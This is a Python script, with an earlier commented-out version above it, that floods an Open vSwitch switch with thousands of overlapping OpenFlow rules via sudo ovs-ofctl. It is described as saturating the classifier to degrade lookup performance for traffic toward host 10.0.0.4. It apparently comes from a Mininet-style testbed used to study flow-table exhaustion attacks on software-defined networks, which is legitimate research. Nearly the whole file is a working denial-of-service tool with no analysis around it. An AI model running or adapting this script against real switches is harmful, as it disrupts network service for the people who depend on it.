

# #!/usr/bin/env python3
# import argparse
# import subprocess
# import sys


# def parse_args():
#     parser = argparse.ArgumentParser(
#         description="Saturate OVS flow table with overlapping priority rules for the same host pair."
#     )
#     parser.add_argument("-s", "--switch", default="s1", help="Target switch (default: s1)")
#     parser.add_argument("-n", "--num-rules", type=int, default=4000, help="Number of dummy rules")
#     parser.add_argument("-p", "--base-priority", type=int, default=200, help="Starting priority")
#     parser.add_argument("--in-port", default="1", help="Ingress port from h1")
#     parser.add_argument("--out-port", default="2", help="Egress port toward s2 (Path 1)")
#     parser.add_argument("--src-ip", default="10.0.0.1", help="Source IP (h1)")
#     parser.add_argument("--dst-ip", default="10.0.0.4", help="Destination IP (h4)")
#     return parser.parse_args()


# def build_rules(args):
#     lines = []
#     for i in range(args.num_rules):
#         priority = args.base_priority + i
#         # Exact same pair (10.0.0.1 -> 10.0.0.4) differentiated purely by priority
#         rule = (
#             f"priority={priority},in_port={args.in_port},ip,"
#             f"nw_src={args.src_ip},nw_dst={args.dst_ip},actions=output:{args.out_port}"
#         )
#         lines.append(rule)
#     return "\n".join(lines) + "\n"


# def main():
#     args = parse_args()

#     print(f"Generating {args.num_rules} overlapping priority rules for {args.src_ip} -> {args.dst_ip}...")
#     rules = build_rules(args)

#     print(f"Installing rules into {args.switch} via ovs-ofctl...")
#     cmd = ["sudo", "ovs-ofctl", "-O", "OpenFlow13", "add-flows", args.switch, "-"]
#     try:
#         subprocess.run(cmd, input=rules, text=True, check=True)
#     except subprocess.CalledProcessError as e:
#         print(f"Error installing flows: {e}", file=sys.stderr)
#         sys.exit(1)

#     count_cmd = ["sudo", "ovs-ofctl", "-O", "OpenFlow13", "dump-flows", args.switch]
#     out = subprocess.check_output(count_cmd, text=True)
#     active = max(0, len(out.strip().splitlines()) - 1)
#     print(f"Done. Current flows installed on {args.switch}: {active}")


# if __name__ == "__main__":
#     main()









#!/usr/bin/env python3
import argparse
import subprocess
import sys


def parse_args():
    parser = argparse.ArgumentParser(
        description="Saturate OVS classifier to degrade lookup performance."
    )
    parser.add_argument("-s", "--switch", default="s1")
    parser.add_argument("-n", "--num-rules", type=int, default=4000)
    parser.add_argument("-p", "--base-priority", type=int, default=200)
    return parser.parse_args()


def build_rules(args):
    lines = []
    # Generates thousands of overlapping wildcard rules targeting traffic toward h4
    for i in range(args.num_rules):
        priority = args.base_priority + (i % 500)
        tp_dst = 1000 + (i % 3000)
        rule = (
            f"priority={priority},ip,nw_dst=10.0.0.4,udp,tp_dst={tp_dst},"
            f"actions=output:2"
        )
        lines.append(rule)
    return "\n".join(lines) + "\n"


def main():
    args = parse_args()
    print(f"Generating {args.num_rules} overlapping classifier rules on {args.switch}...")
    rules = build_rules(args)

    cmd = ["sudo", "ovs-ofctl", "-O", "OpenFlow13", "add-flows", args.switch, "-"]
    try:
        subprocess.run(cmd, input=rules, text=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error installing flows: {e}", file=sys.stderr)
        sys.exit(1)

    count_cmd = ["sudo", "ovs-ofctl", "-O", "OpenFlow13", "dump-flows", args.switch]
    out = subprocess.check_output(count_cmd, text=True)
    active = max(0, len(out.strip().splitlines()) - 1)
    print(f"Done. Current flows installed on {args.switch}: {active}")


if __name__ == "__main__":
    main()